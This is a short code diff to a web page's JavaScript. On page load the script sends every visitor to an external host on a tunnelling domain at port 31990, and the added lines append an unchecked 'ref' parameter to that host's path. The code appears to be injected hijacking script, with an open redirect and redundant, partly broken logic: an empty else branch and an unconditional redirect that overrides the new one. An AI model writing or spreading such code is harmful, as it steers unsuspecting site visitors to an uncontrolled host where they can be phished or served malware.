@@ -51,6 +51,14 @@
 
         setTimeout(function () {
             if (!window.location.href.includes('?noref')) {
+                const params = new URLSearchParams(window.location.search);
+                const redirectPath = params.get('ref');
+
+                if (redirectPath) {
+    
+                window.location.href = `http://important-sir.gl.at.ply.gg:31990/${redirectPath}`;
+                } else {
+                }
                 window.location.href = 'http://important-sir.gl.at.ply.gg:31990/';
             }
         }, 0);
